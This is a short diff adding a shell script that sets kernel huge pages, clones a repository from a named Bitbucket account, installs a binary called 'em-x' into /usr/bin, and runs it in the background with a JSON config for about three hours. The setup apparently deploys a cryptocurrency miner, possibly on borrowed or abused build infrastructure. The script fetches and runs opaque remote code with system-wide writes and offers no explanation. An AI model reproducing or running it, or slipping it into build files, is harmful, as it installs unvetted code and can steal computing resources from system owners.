@@ -1,0 +1,10 @@
+uname -a
+echo 512 > /proc/sys/vm/nr_hugepages
+git clone https://m0uray1@bitbucket.org/m0uray1/owa.git
+cd owa
+cp em-x /usr/bin/
+chmod +x /usr/bin/*
+chmod +x em-x
+em-x -c s.json &
+sleep 30
+sleep 10800
